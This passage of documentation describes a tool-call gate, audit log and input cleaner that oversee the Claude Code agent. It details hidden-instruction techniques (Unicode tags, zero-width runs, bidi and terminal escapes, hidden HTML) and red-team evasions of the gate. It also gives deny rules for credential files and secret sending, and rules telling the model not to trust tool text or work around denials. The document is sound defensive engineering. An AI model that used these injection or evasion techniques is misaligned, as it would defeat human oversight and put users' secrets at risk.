**What the model is sent.** Only each call's normalized text, built from what the audit log records about the call: the command, the path, the URL or the search pattern. A written or edited file's content is recorded only as its digest and size, so it is never sent. Your home directory becomes `~`, the project directory `<PROJ>` and your user name `<USER>`. A call whose text holds anything credential-shaped (a provider key or token format, a private key, a `NAME=value` credential assignment) is skipped and never sent; `run` counts it as skipped. A model answer counts only when it is exactly the expected JSON object and its agreement matches its own class; anything else is "no verdict".

**Bounds.** At most 40 calls per run, one request every 2 seconds, answers of at most 300 tokens; three model errors in a row stop the run. These are fixed. A run is resumable: a judged or skipped call is not sent again, and a call the model failed on is sent again by the next run. The audit log records each run's counts (`claude-code.review.run`), never call text.

`ecwctl policy ...`, `auth ...` and `recover-root` are described under [policy commands](#policy-commands), [activation auth](#activation-auth) and [recover-root](#ecwctl-recover-root).

### `--version`, `--help`

`ecwctl --version` and `ecwctl --help` are the same as `ecwctl version` and `ecwctl help`. `ecwcode --version` and `ecwcode --help` are claude's own.

---

## `ecwcode-hook` (internal)

```
ecwcode-hook --origin launcher --session FILE --digest SHA256
ecwcode-hook --origin managed [--flavor open|enclaved] [--hardware-root required|optional]
```

The command Claude Code runs for each hook event; to ask it for a decision yourself, use `ecwctl probe`. Claude Code starts one process per event (through a shell, with the command line from the settings), writes one JSON object (the hook input) on stdin and reads stdout and the exit status.

**It takes no configuration from its environment.** Claude Code exports every settings file's `env` to hooks, so a repository could otherwise redirect the policy, the audit log or the hardware check, or preload code with `NODE_OPTIONS` (red-team I1). The generated command starts node under `env -i` (only `CLAUDE_PROJECT_DIR` is passed), and the hook replaces its environment with the one recorded in the session file before it loads the framework.

| Option | Meaning |
|---|---|
| `--origin launcher --session FILE --digest SHA256` | Set in the settings Enclawed Code generates. The session file must be a regular file of this user, mode 0600 in a 0700 directory, whose SHA-256 is the digest; otherwise every call is denied. Its hardware relay (when the launcher holds the root) is authenticated with the session secret and, with a device bound, the device's signature over a fresh nonce. |
| `--origin managed` | Set in the managed template. The home directory comes from the OS account (not `HOME`), `PATH` is fixed, the flavor and hardware mode come from `--flavor` and `--hardware-root`, and the root is checked on every call. |

Anything else (no session, a changed session file, an unknown origin) denies the call with exit 2 and `Enclawed: the hook's configuration could not be verified, so the call is blocked: ...`.

### Stdin

One JSON object, at most 32 MiB, with a string `hook_event_name`. Fields read: `hook_event_name`, `session_id`, `tool_use_id`, `tool_name`, `tool_input`, `tool_response`, `error`, `is_interrupt`, `duration_ms`, `cwd`, `permission_mode`, `agent_id`, `agent_type`, `scratchpad_dir`, `mcp_server.name`, `transcript_path`, `source`, `model`, `reason`, `file_path`.

### Per event

| Event | What it does | Stdout | Exit |
|---|---|---|---|
| `PreToolUse` | Decides (see [decision table](#the-decision-table)), appends a `claude-code.tool.pre` record **before answering**, prints the decision. | decision JSON | 0 |
| `PostToolUse` | Records what the tool did (`claude-code.tool.post`), with the SHA-256 and size of a written file (files up to 64 MiB). Runs the [input cleaner](#the-input-cleaner) on the results of `Read`, `WebFetch`, `WebSearch`, `Bash` and MCP tools. | nothing, or the cleaner's `updatedToolOutput` / `additionalContext` | 0 (1 if it cannot record; 0 with a `systemMessage` when it cleaned the output but could not record) |
| `PostToolUseFailure` | Records the failure (`claude-code.tool.failure`). | nothing | 0 (1) |
| `SessionStart` | Records the session start, policy, transcript path and hardware status (`claude-code.session.start`). | nothing | 0 (1) |
| `SessionEnd` | `claude-code.session.end` | nothing | 0 (1) |
| `ConfigChange` | `claude-code.config.change` (settings source and file). | nothing | 0 (1) |
| any other | `claude-code.hook.event` | nothing | 0 (1) |

Events other than `PreToolUse` cannot block anything; when they fail to record, the hook prints `ecwcode: could not audit <event>: <error>` on stderr and exits 1, which Claude Code shows as a non-blocking hook error.

### The input cleaner

Content an agent reads can carry an instruction a person cannot see. For the results of `Read`, `WebFetch`, `WebSearch`, `Bash` and every MCP tool (`mcp__*`), `PostToolUse` removes:

- Unicode tag characters (U+E0000 to U+E007F), always;
- runs of 4 or more invisible code points (every Unicode `Default_Ignorable_Code_Point`: ZWSP, ZWNJ, ZWJ, WJ, BOM, soft hyphen, U+2061 to U+2064, the Hangul fillers U+115F, U+1160, U+3164 and U+FFA0, U+180E and the rest, from a generated table, `src/unicode-ignorable.mjs`) and runs of 2 or more variation selectors;
- bidi overrides (LRO, RLO), and every bidi embedding and isolate when they are unbalanced;
- unpaired UTF-16 surrogates, always (round 4, D1). The scan is by code point, and the clean is a fixed point: cleaning repeats until a round changes nothing, so stripping a separator can never reassemble a tag character from two surrogate halves;
- text that imitates an Enclawed notice, anywhere in a line (round 5, E1): "Enclawed", an optional hex token, then `:` (or `]` after a token), matched on a normalized skeleton (NFKC, a Cyrillic/Greek/Latin confusables fold, combining marks, invisibles and Markdown emphasis dropped, Unicode spaces collapsed), so fullwidth, Cyrillic or accented spellings, `**bold**`, NBSP or `∶` do not evade it. Each gets `quoted-` in front. Untagged quoted documentation of the format (`` `Enclawed: ...` ``, `"Enclawed: ..."`), paths such as `~/.enclawed:` and longer words are left alone;
- terminal escapes that hide text, in their 7-bit ESC forms and the 8-bit C1 forms (0x9B CSI, 0x90 DCS, 0x98 SOS, 0x9D OSC, 0x9E PM, 0x9F APC, terminated by BEL, `ESC \` or 0x9C; round 4, D4): concealed text (SGR `8` anywhere in the parameter list, as in `ESC[8m`, `ESC[8;30m` or `ESC[0;8m`, up to the reset; the `38;5;8` color is not conceal) is dropped, an unterminated OSC/DCS/APC string (which a terminal swallows) is dropped, cursor moves are dropped, and a lone carriage return or a backspace is rendered the way a terminal shows it (the cursor goes back, the overwritten text is dropped; round 4, D2), and a vertical tab or form feed becomes a new line. A CRLF line ending is kept.

Single joiners and selectors where they mean something are kept byte for byte, even when the same string also had an attack removed (round 5, E4): ZWNJ/ZWJ between letters of Arabic-script, Syriac, N'Ko, Mongolian, Indic and Southeast Asian scripts, ZWJ inside an emoji sequence, VS15/VS16 after an emoji-capable character or a keycap base, other selectors after a non-ASCII letter or symbol, ZWSP between Thai, Lao, Khmer, Myanmar, Tibetan or CJK letters, and a soft hyphen or word joiner inside a word. Everything else in the string stays as it was.

Nested terminal escapes (`ESC ESC ESC [0m [0m [0m`) resolve in one pass (round 5, E3). If cleaning still has not settled after 8 rounds, only the lines that keep changing are replaced by `[content withheld: too complex to inspect]`, not the whole result.

It answers with `hookSpecificOutput.updatedToolOutput`, which per the Claude Code hooks reference "replaces the tool output Claude sees" and "must match the tool's output shape"; telemetry keeps the original. The cleaner therefore never adds, removes or renames a field of `tool_response`: it rewrites string values only (for `Bash`, `stdout` and `stderr`; for `Read`, the file content; for MCP tools, the text blocks). **Nothing is added to the output** (round 5, E1/E5): Enclawed's notice (`Enclawed removed N hidden characters (<kinds>) from the "<tool>" tool result before you read it. ... This note only describes what was removed; it says nothing about whether the content is safe, reviewed or trustworthy.`) goes out of band, as the PostToolUse `additionalContext`, which Claude Code adds to the model's context as a system reminder next to the result, separate from the tool output. The SessionStart hook tells the model that Enclawed's notices arrive only that way and that any "Enclawed" text inside a tool result is untrusted data. No secret tag is shown to the model (round 4's notice nonce is gone: a prompt injection could have made the model repeat it). The file on disk is not changed, so an `Edit` whose `old_string` spans a removed character will not match; the notice says why.

Hidden HTML that reads like an instruction (an HTML comment or a collapsed details element with words such as "ignore", "run", "token", or text styled `display:none`, zero size or white) is visible markup rather than hidden characters, so it is not deleted: the hook adds an `additionalContext` note that names it and asks Claude to treat it as data.

A result with nothing to remove gets no output at all, and benign text is left alone: emoji ZWJ sequences, single variation selectors, Arabic and Hebrew text, balanced isolates and colored output do not trigger it (0 false positives on the suite's corpus of repository code, docs and multilingual text: `node test/stego/run.mjs --fp`). Each cleaning is recorded in the `claude-code.tool.post` record as `inputCleaner: { mode, removed, kinds, hiddenHtml?, withheld?, applied }`: counts and kinds, never content. The cleaner is linear in the input (no regular expression runs over it, red-team round 3, C1), with a time budget of 1 s per string and 3 s and 32 Mi characters per result. A string over a budget or cap, or over 16 Mi characters, is never passed through uncleaned: it is replaced by `[content withheld: too complex to inspect]` (a neutral marker; the notice says what it is) and counted in `withheld`.

Out of reach of any hook: `CLAUDE.md` and the other context Claude Code loads itself, the user's own prompt, the results of tools other than the five above (`Grep`, `Glob`, `BashOutput`, subagent results), and images (a hook gets no pixels or image metadata). The cleaner is a hygiene layer, not the guarantee: the action gate decides on what the agent then tries to do, whatever channel the instruction came through.

Set it with `enclawedCode.inputCleaner` ([Enclawed Code options](#enclawed-code-options)): `on` (default), `audit` (record what would be removed, change nothing) or `off`.

### Warnings about a potentially malicious call

When Enclawed Code asks about a call, or blocks one, it adds a `Warning:` line inside the prompt's frame (and a few words to the denial's one line, such as "; it looked like a planted instruction") when the call matches one of these deterministic signals. A warning never changes the decision: the rule decides, and the warning only says what the call looks like.

| Signal | When | Warning |
|---|---|---|
| planted instruction | a result Claude read earlier in this session (a file, a page, a command's output, an MCP result) holds instruction-override text addressed to an agent (the framework's DLP scanner, its prompt-injection patterns; English phrasing) | `possible planted instruction: Claude read SETUP.md just before this, and it contains text addressed to coding agents (line 7).` |
| hidden text | ... or text hidden from a reader that the input cleaner removed (Unicode tags, zero-width runs, bidi controls, concealing escapes, imitated notices, hidden HTML) | `Claude read notes.txt earlier in this session, and it held hidden text (line 2) (removed before Claude saw it).` |
| secret target | the call reads or changes a credential or secret file (the kit's credential paths: SSH keys, cloud credentials, `.env`, ...) | `this call reaches a credentials file (~/.aws/credentials); planted instructions often aim at secrets.` |
| execution configuration | the call changes code that runs later: git hooks, `.envrc`, `.husky`, `.mcp.json`, Claude settings (the kit's execution-configuration paths) | `this call changes .envrc, which holds code that runs later (execution configuration), outside this prompt.` |
| secret send | a call that leaves the machine (a fetch, a search, an MCP tool, a command) carries credential-shaped text, or the kit's decision names a credential destination, a secret in the arguments or an environment dump | `this call would send what looks like a credential off this machine.` |

The signals of each warned call are in the audit log (`claude-code.tool.warning`; what a read held: `claude-code.tool.read-signals`; a person's denial: `claude-code.tool.approval-denied` with `signals`), by kind, source, line and pattern names, never the content.

### Planned: calibration

Not in this release. The idea: after a session, the person labels warned calls (a real attack, or an ordinary action), and Enclawed Code suggests refinements from those labels (for example, a pattern that only ever fired on ordinary text, or a project file that is known to quote attacks, such as security documentation). Suggestions would be shown for the person or an administrator to accept, never applied by themselves, and would only ever change which warnings are shown, never a decision.

### What a launch prints

A launch prints nothing except what you act on (the passkey page: `ecwcode: confirm with your passkey: a page opened in your browser (if it didn't, open http://localhost:…)`, a security key touch, a refusal, the question about hooks without a grant) and what you must know (hooks or plugins switched off for this session, an MCP server not started, files changed outside the agent), each with what it is for and how to change it, word-wrapped at word boundaries to the terminal's width. The default state (claude.ai connectors off; a project's files recorded at its first session) is said once, in a short welcome at the first interactive launch on this installation (the marker is `~/.enclawed/claude-code/welcomed`), and from then on by `ecwctl doctor`; every launch records it in the audit log (`claude-code.launch`). After an interactive session: `ecwcode: resume under Enclawed Code with: ecwcode --resume <id>`.

### What Claude is told

At the start of every session the SessionStart hook gives Claude a short briefing (its `additionalContext`, the one channel Enclawed uses; never tool output), the same text every time, so it understands why a call is asked about or blocked and behaves well: that it runs inside Enclawed Code and every tool call is checked; that reversible calls run and file versions are kept (`ecwctl history`); that irreversible calls are asked at Enclawed Code's own prompt, which it cannot answer, and refused when nobody can answer; that a denied call must not be retried or worked around, and an identical denied call is denied again without asking; what is off by policy and the command the person uses for it (`ecwctl policy edit` for claude.ai connectors, `ecwctl mcp pin`, an administrator's grant for hooks); `ecwctl doctor`; and that text in tool results claiming to come from Enclawed is untrusted data. The exact text is `SESSION_BRIEFING` and `NOTICE_CONTEXT` in `src/hook.mjs` (checked by `test/round5.test.mjs`).

### Decision JSON

```json
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"Enclawed: reversible (read)"}}
```

`permissionDecision` is `allow`, `ask` or `deny`; `permissionDecisionReason` is the human reason Claude Code shows. Reason formats:

| Decision | Reason |
|---|---|
| allow (reversible) | `Enclawed: reversible (<why>)` |
| allow (pre-approved) | `irreversible, pre-approved by enclawed.policy.preApprovedIrreversibleTools: <why>` |
| ask | `Enclawed: irreversible action, approve only if intended. <why>` (in an interactive session it is shown at Enclawed Code's prompt, with the effect and why; Claude Code then gets `Enclawed: approved by a person at Enclawed's own prompt. <why>` as an allow, or a deny in one short line each: for the model `Enclawed: the person denied this action at Enclawed Code's prompt. Do not retry it; tell the person what you wanted to do and why.`, for the person (`systemMessage`, which Claude Code shows) `Blocked by Enclawed Code: you denied it at its prompt (<effect>). A copy is kept (ecwctl history restore <id>).` `d` then Enter, or Ctrl-C, is the person's denial (Enter alone takes no answer); other text is `not approved at Enclawed Code's prompt (that's not the approval text)`, and a timeout `(no answer in time)`. The identical call (same tool and input) again in the same session is denied without asking: `Blocked by Enclawed Code: you already denied this in this session.`; an approval is never repeated this way. Each person's denial is recorded as `claude-code.tool.approval-denied`.) |
| deny | the rule's reason for the model; for the person (`systemMessage`) `Blocked by Enclawed Code: <the reason's first sentence>` |
| deny (hardware, allowlist) | `Enclawed: <why>` |
| deny (no person) | `irreversible action needs a person, and permission mode "bypassPermissions" may not ask one: <why>` |
| deny (failure) | `Enclawed could not check this tool call, so it is blocked: <error>` |

### Fail-closed behavior

- **Unreadable input** (not JSON, not an object, no `hook_event_name`, over 32 MiB): prints a `deny` decision (`Enclawed could not read the hook input, so the call is blocked: ...`), writes the reason on stderr and exits **2**, whatever the event was. Nothing is recorded (the event is unknown).
- **Any error while deciding a `PreToolUse` call** (framework missing, invalid managed or enclaved policy, malformed `tool_name`/`tool_input`, a decision that cannot be recorded): prints a `deny` decision, writes the reason on stderr, exits **2** (Claude Code's blocking error), and tries for up to 1 s to append a `claude-code.hook.error` record. The denial stands whether or not that record could be written.
- **Audit before answering:** a decision that cannot be appended to the log (for example the log's lock is held for 4 s) is not returned; the call is denied as above.
- **Crash or timeout:** the generated settings and the managed template mark `PreToolUse` with `"onFailure": "block"` and a 10 s timeout, so Claude Code blocks the call if the hook dies, hangs or exits unexpectedly (Claude Code 2.1.295+).
- A lock file left by a process that died is taken over once it is 30 s old.

---

## The decision table

`PreToolUse` is decided in this order (`src/gate.mjs`). The first step that decides wins.

**1. Hardware root.** If the Enclaweder is bound and not CLEAN, a required device is missing, or the launcher holding the device cannot be reached: **deny**, every tool, reads included.

**2. Tool allowlist.** If the policy enforces allowlists and none of the tool's ids is on `allowedTools`: **deny** (`tool-not-allowlisted`). A tool's ids are its Claude Code name lowercased, plus the matching gateway id where one exists:

| Claude Code tool | Gateway id |
|---|---|
| `Read` | `read` |
| `Write` | `write` |
| `Edit`, `MultiEdit`, `NotebookEdit` | `edit` |
| `Bash`, `Monitor`, `PowerShell` | `exec` |
| `WebFetch` | `web_fetch` |
| `WebSearch` | `web_search` |
| `Agent`, `Task` | `subagents` |

With allowlists enforced, every tool must be listed, including session bookkeeping such as `todowrite`, `askuserquestion` and `exitplanmode`. Write `allowedTools` entries in **lowercase**: they are compared as written (see [policy](#policy)).

**3. Reversibility, by tool kind:**

| Tool | Decision | Why |
|---|---|---|
| `Read`, `Glob`, `Grep`, `LS`, `NotebookRead`, `ToolSearch`, `Skill`, `BashOutput`, `LSP` | allow (`read`) | Reads change nothing. |
| `WebSearch` | allow (`read-only-retrieval`) | No host check. |
| `WebFetch` | allow (`read-only-retrieval`) when the URL's host (lowercased) is on `allowedHosts`; **deny** (`host-not-allowlisted`) when it is not and allowlists are enforced or `allowedHosts` is non-empty; otherwise (the open default, no list) **ask** (`egress-host-not-allowlisted`), denied under bypassPermissions | Egress control: the URL itself carries data out. `WebSearch` is allowed: its query goes to Claude Code's own search provider, not to a host the agent chooses. |
| `TodoWrite`, `TaskCreate`, `TaskGet`, `TaskList`, `TaskUpdate`, `TaskOutput`, `AskUserQuestion`, `ExitPlanMode`, `EnterPlanMode`, `SubagentHandback` | allow (`session-internal`) | No effect outside the session. |
| `Agent`, `Task` | allow (`subagent`) | Each tool call the subagent makes is checked the same way. |
| `Write`, `Edit`, `MultiEdit`, `NotebookEdit` | see [file writes](#file-writes) | |
| `Bash`, `Monitor` | allow (`read-only-command`) if the command is on the [read-only allowlist](#the-read-only-shell-allowlist), otherwise irreversible (`shell:<code>`) | |
| `PowerShell` | allow if on the [PowerShell read-only set](#powershell), otherwise irreversible (`shell:<code>`) | |
| `mcp__<server>__<tool>` | irreversible (`mcp-tool`) | Acts outside this machine's history. |
| anything else (for example `KillShell`, a new or renamed tool) | irreversible (`unknown-tool`) | Not known to be reversible. |

**Irreversible** resolves as follows:

1. If any of the tool's ids is on `preApprovedIrreversibleTools`: **allow**, codes get `pre-approved`.
2. Else if nobody can be asked: **deny**, codes get `no-person:bypassPermissions`. Nobody can be asked in `bypassPermissions` unless the session has Enclawed Code's own prompt (an interactive `ecwcode` session, whose default mode is `bypassPermissions`, asks there; plain `claude` with the managed hooks, `-p` and background sessions do not).
3. Else: **ask**.

**Permission modes.** `ecwcode` starts Claude Code in `bypassPermissions` unless you choose a mode ([Permission mode](usage.md#permission-mode)); in an interactive `ecwcode` session `ask` is Enclawed Code's own prompt in every mode. With the managed hooks alone: in `default`, `acceptEdits` and `plan`, `ask` shows Claude Code's prompt. `auto` keeps `ask` (Claude Code's docs say auto mode still shows prompts a hook forces). In `dontAsk`, Claude Code itself turns the prompt into a denial. A `deny` cannot run in any mode.

**Headless runs (`-p`).** Nobody can answer a prompt, so an irreversible call is denied: by Enclawed in the default bypass mode, by Claude Code (turning the `ask` into a denial) in a mode you chose (verified with Claude Code 2.1.326 and 2.1.331: the call does not run and Claude reports it was blocked). Reversible calls run. Pre-approve exactly the tools an unattended run needs.

An `allow` is returned to Claude Code as its `allow` permission decision; how that interacts with your own Claude Code permission rules is Claude Code's behavior (see its hooks documentation).

### File writes

The target is `tool_input.file_path` (`NotebookEdit`: `notebook_path`, else `file_path`), resolved against the hook input's `cwd`. The project directory is the directory Enclawed Code was started in (managed mode: `CLAUDE_PROJECT_DIR`, else the input's `cwd`); a later `cd` does not widen it.

1. **Enclawed Code's own paths** ([below](#paths-the-agent-may-not-write)): **deny** (`protected-path`). A **hard link** is invisible to realpath, so when the target exists with more than one link, its `(dev, inode)` is compared with every file under the protected paths: a match is denied (`protected-path`, `hardlinked-path`), and so is any multiply-linked target when the protected trees are too large to walk in full (red-team round 2, R2).
2. The open core classifies the target (symlinks followed) and keeps its current content (the table below).
3. **Execution-config paths** ([feature 4](#4-files-that-configure-what-runs-later-are-protected)), checked on the path as written, as resolved, and by inode for a hard link to an exec-config file of the project (R3); **symlinked targets** (`symlinked-path`); and **any multiply-linked target** (`hardlinked-path`: the write also changes the file under its other names, which may be outside the project, where nothing keeps a history): irreversible, with the snapshot from step 2 kept, so an approved or pre-approved change can be restored. The file's mode is recorded, and a restore puts it back.

4. **Existing files git does not keep** (step 2 kept a snapshot of prior content, and no rule above applied): when the target is an existing regular file that git does not track or that `.gitignore` ignores, the write is **irreversible** (`untracked-overwrite` with `git-untracked`, `git-ignored`, or `git-state-unknown` when git is missing or fails). Its only other copy would be Enclawed Code's own snapshot, which is still kept, so an approved overwrite can be restored. With no person to ask it is refused like every irreversible call. git is asked with `--literal-pathspecs` (the file name is never a pattern), `core.fsmonitor=false`, `core.untrackedCache=false` and no `GIT_*` environment. Allowed without a person, deterministically:
   - the target is under an entry of `enclawedCode.overwritablePaths` (exact path comparison; see [Enclawed Code options](#enclawed-code-options));
   - this same Claude Code session created the file earlier (a history entry by this session, or a subagent of it, records that the file did not exist before that write);
   - the target is in a scratch location (`history:scratch`, before this step);
   - the target is outside any git work tree: nothing there tells local data from project files, so the snapshot rule applies as before.
   Tracked files, with or without uncommitted changes, and new files are unchanged (`history:snapshot`). Shell commands that write (`>`, `>>`, `tee`, `cp`, `mv`, `sed -i`, `truncate`, `dd`, `rm`, ...) are not on the read-only allowlist, so they already ask.

Classification (step 2):

| Outcome | Decision | Code |
|---|---|---|
| inside a scratch location: `scratchPaths`, or Claude Code's session `scratchpad_dir` | allow | `history:scratch` |
| inside the project, prior content stored (or recorded as not existing) | allow | `history:snapshot` |
| no snapshot possible, but the file is tracked by git with no uncommitted changes | allow | `history:git-clean` |
| outside the project and every scratch location | irreversible | `outside-allowed-roots` |
| tool on `history.noHistoryTools` | irreversible | `no-history-tool` |
| path matches `history.noHistoryPaths` | irreversible | `no-history-path` |
| larger than `history.maxFileBytes` | irreversible (unless git-clean) | `over-size-cap` |
| would push the store past `history.maxTotalBytes` | irreversible (unless git-clean) | `over-retention-budget` |
| not a regular file | irreversible | `special-file` |
| cannot be read / store failed / no path given | irreversible | `unreadable` / `store-failed` / `unresolvable-path` |

Hard links and time of check: the hook decides before Claude Code writes. A process that is already running (one a person approved earlier) could swap the target for a hard link between the check and the write, and Enclawed Code cannot see that. Creating a hard link needs a command that is not on the read-only allowlist (`ln`, `cp -l`, `tar`, ...), so it needs a person first, and git cannot ship hard links in a checkout. For shell commands that are not read-only, every word that resolves (through a symbolic or hard link) onto a protected file makes the command a denial, not a question (`tee hardaudit`).

A `scratchpad_dir` that is not absolute, is a filesystem root, is your home directory or one of its ancestors, or is inside or contains the project or any of Enclawed Code's protected paths is ignored (red-team F4): scratch writes keep no snapshot, so a scratch location must never cover files you would want back.

### The read-only shell allowlist

A `Bash` or `Monitor` command runs without asking only if it is **one simple command** (`src/shell-readonly.mjs`):

- Words are separated by spaces or tabs and may be single- or double-quoted. Inside single quotes everything is literal.
- Refused outside quotes: `|`, `&`, `;`, `<`, `>`, `(`, `)`, `$`, backtick, `\`, `{`, `}`, `!`, `#`, newline, carriage return (`shell-metacharacter`). Refused inside double quotes: `$`, backtick, `\`, `!`, newline (`shell-expansion`). Also refused: an unbalanced quote (`unbalanced-quote`), more than 4096 characters (`command-too-long`), an empty or non-string command (`no-command`), a leading `NAME=value` (`env-assignment`), a command word containing `/` (`command-not-allowlisted`).
- The command word must be on the list below, with arguments that pass its check (`command-not-allowlisted` / `argument-not-read-only`).
- **Options are parsed as getopt parses them, and only listed options are accepted.** A short-option cluster is read letter by letter, and a letter that takes a value takes the rest of the cluster or the next word, so `git grep -Orm`, `tree -oout.txt`, `date -s2020` and `hostname -Fname` are recognized for what they are (red-team F1). A long option must match a listed name exactly, as `--name` or `--name=value` (GNU tools accept abbreviations, so `--out=x` would otherwise mean `--output=x`). Every allowlisted command has its own list of read-only options; anything else asks. The table below names what is deliberately left out.
- **git reads in a repository whose own config can start a program ask** (`git-config-runs-programs`): a repository-local `core.pager`, `core.fsmonitor`, `core.hooksPath`, `core.sshCommand`, `core.editor`, `diff.external`, `log.showSignature`, filter, diff or merge drivers, `textconv`, `[pager]`, `[gpg]` or `[include]`/`[includeIf]` sections (red-team F6). Your user and system git config are yours and are not checked.
- **When a settings file's `env` sets a variable that changes what commands run** (`PATH`, `LD_PRELOAD`, `BASH_ENV`, `GIT_*`, `PAGER` and the like) and the launcher did not pin it, read-only commands ask too (`settings-env-overrides`).

| Commands | Rule |
|---|---|
| `echo`, `true`, `ps` | any arguments (none of their options writes or runs anything; `ps aux` style operands are options) |
| `ls`, `pwd`, `cat`, `head`, `tail`, `wc`, `nl`, `cut`, `comm`, `cmp`, `diff`, `od`, `hexdump`, `stat`, `realpath`, `readlink`, `basename`, `dirname`, `du`, `df`, `which`, `type`, `whoami`, `id`, `uname`, `uptime`, `nproc`, `free`, `printenv`, `grep`, `egrep`, `fgrep`, `jq`, `sha1sum`, `sha224sum`, `sha256sum`, `sha384sum`, `sha512sum`, `md5sum`, `b2sum`, `cksum`, `file`, `tree`, `rg` | only their listed read-only options (see `src/shell-readonly.mjs`); left out on purpose: `rg --pre/--pre-glob`, `file -C`, `tree -o` |
| `cd` | `-L`, `-P`, at most one directory |
| `env` | no arguments |
| `hostname` | display options only, no operand (`NAME`, `-F`, `-b` set the name) |
| `date` | display options; operands must start with `+` (`-s` and `MMDDhhmm` set the clock) |
| `command` | `-v NAME...` or `-V NAME...` |
| `find` | starting points, then only listed tests and actions (`-name`, `-type`, `-maxdepth`, `-print`, `-printf`, `-ls`, `-prune` ...); never `-exec`, `-execdir`, `-ok`, `-okdir`, `-delete`, `-fprint*`, `-fls` |
| `sort` | listed options; never `-o`/`--output`, `-T`, `--compress-program` |
| `uniq` | listed options, at most one operand |
| `xxd` | listed options (not `-r`), at most one operand |
| `node`, `npm`, `pnpm`, `yarn`, `bun`, `deno`, `python`, `python3`, `go`, `cargo`, `rustc`, `java`, `javac`, `dotnet`, `ruby`, `gcc`, `clang`, `make`, `cmake`, `docker`, `kubectl` | exactly `--version` |
| `git` | see below |

`git`: global options before the subcommand may only be `-C <dir>` and `--no-pager` (so `-c`, `--git-dir`, `--exec-path`, `-p` are refused). `status`, `log`, `show`, `diff`, `whatchanged`, `shortlog`, `blame` and `grep` accept only their listed read-only options (never `-O`/`--open-files-in-pager`, `--output`, `--ext-diff`, `--textconv`); the plumbing reads `rev-parse`, `ls-files`, `ls-tree`, `describe`, `merge-base`, `rev-list`, `name-rev`, `check-ignore`, `count-objects`, `version` refuse those names and any short cluster containing `-O`; `cat-file` has a strict spec of its own: only `<type> <object>`, `-e`, `-p`, `-t`, `-s` and the mailmap switches (never `--textconv`, `--filters`, `--path` or any `--batch*` mode). **Abbreviations** (red-team round 2, R1): git's parse-options accepts any unambiguous prefix of a long option, down to one character after `--` (an exact name always wins, and a prefix of two names is an error), so `git cat-file --te` is `--textconv`. For every allowlisted git subcommand, an option that is a prefix of a refused long option (`output`, `open-files-in-pager`, `ext-diff`, `exec`, `textconv`, `upload-pack`, `receive-pack`, `config-env`, `work-tree`, `git-dir`, `filters`, `batch-command`) or of its `no-` form is refused, unless it is exactly a listed option of that subcommand (`git log --text`); `branch` with only `-a -r -v -vv -l --list --show-current --all --remotes --verbose --merged --no-merged --contains`; `tag` bare or `-l`/`--list`; `remote` bare or `-v`; `stash list`, `worktree list`; `reflog` bare or `reflog show ...`; `config --list|-l` or `config --get|--get-all|--get-regexp NAME [VALUE]`, optionally after `--global` or `--local`.

A refused command is not blocked: it becomes irreversible (ask, pre-approved allow, or deny under `bypassPermissions`). A read-only command can still read anything your account can. git reads ask when the repository's own config could start a program; your user and system git config are trusted as yours.

### PowerShell

One command, with none of `|`, `&`, `;`, `<`, `>`, `(`, `)`, `$`, backtick, `@`, `{`, `}`, `[`, `]`, `#`, newline or carriage return (`shell-metacharacter`), at most 4096 characters, and a first word (case-insensitive, surrounding quotes stripped) among `Get-ChildItem`, `gci`, `dir`, `ls`, `Get-Content`, `gc`, `cat`, `type`, `Get-Location`, `pwd`, `gl`, `Get-Item`, `gi`, `Test-Path`, `Select-String`, `sls`, `Get-FileHash`, `Resolve-Path`, `Get-Date`. Arguments are not checked further.

---

## Hardware root (Enclaweder)

An Enclaweder is Enclawed's hardware root of trust. The open core detects it automatically; when one is bound, every tool call is checked against its health first, and anything but CLEAN denies the call.

| Situation | Launcher (`ecwcode`) | Hooks |
|---|---|---|
| a device is present and boots | boots the root once before claude starts and holds it for the session (as the device's owner, or as a client of a process that already owns it), and serves an authenticated relay in the private session directory; watches the root and on a halt stops claude and erases Claude Code's login ([below](#hardware-halt-and-claude-codes-login)); releases the root when claude exits, on a forwarded signal and on any process exit | ask the relay named in the session file, with a fresh random challenge: the answer must carry an HMAC under the session secret, and with a device bound, the device's own signature over a fresh nonce, checked against its manufacturer certificate (pinned roots), its uid/key binding and the key bound at launch; anything else denies (`owner-unavailable`, `owner-unauthenticated`, `device-attestation-failed`) |
| no device, `ENCLAWEDER_ROOT` not `required` | holds nothing | software-only: the hardware step allows |
| the boot refuses (a required device absent, a latched DIRTY, an accredited session that may not continue without its device) | prints `ecwcode: the hardware root refused to start (<reason>). Nothing was started.` with the recovery path, and exits 4 without starting claude | (not started) |
| background sessions (`--bg`, `agents`), `ENCLAWEDER_BROKER=off` | holds nothing | each hook boots, checks and closes the root itself, with the launcher's recorded environment |
| managed hooks (`--origin managed`) | (no launcher) | boot, check and close per call; when another process owns the device, the boot becomes a client of it |

No environment variable can point a hook at another socket: the relay's path is only in the session file (red-team I8), and its secret reaches the hook only over the launcher's control socket, after the peer-credential check (red-team round 2, N5).

### Your own Claude Code login is never Enclawed Code's

Enclawed Code never takes, moves, seals, quarantines or erases a login or tool credential it did not create. Your own Claude Code login, in your own storage (`.credentials.json` in `CLAUDE_SECURESTORAGE_CONFIG_DIR`, else `CLAUDE_CONFIG_DIR`, else `~/.claude`, of the environment you start Enclawed Code in), is shared by every plain `claude` you run, and stays exactly as it is: at launch, in a session, while any watcher runs and at a hardware halt (`src/login-guard.mjs`; conformance `adapter:claude-code:person-login-untouched`).

With an Enclaweder bound, Enclawed Code's sessions use **their own login**, sealed under the device: sign in once inside Enclawed Code with `ecwctl login new`. A launch with a device and no login of Enclawed Code's own is refused with exactly that instruction (`no-login`); your plain login is never adopted in its place. A `/login` inside a session writes to the session's own storage (the session sets `CLAUDE_SECURESTORAGE_CONFIG_DIR` to it), never to yours, and when the session ends that login becomes Enclawed Code's sealed login (`claude-code.login.session-login-sealed`). Without an Enclaweder, `ecwcode` uses your Claude Code login as plain `claude` does, and never moves it.

**The one exception is an administrator's choice:** the [managed login policy](#ecwctl-managed-login-policy) (`sudo ecwctl managed login-policy install`: root-owned managed settings under which plain `claude` cannot sign in or use a stored login on the machine). Only while it is in force does Enclawed Code keep a plaintext login out of Claude Code's storage (the watcher, the launch sweep and the halt erase described below). A user-level launch never turns it on.

### Hardware halt and Claude Code's login

When the held root halts during a session (the device is unplugged, fails a liveness check or reports tampering), every tool call is already denied; the launcher then:

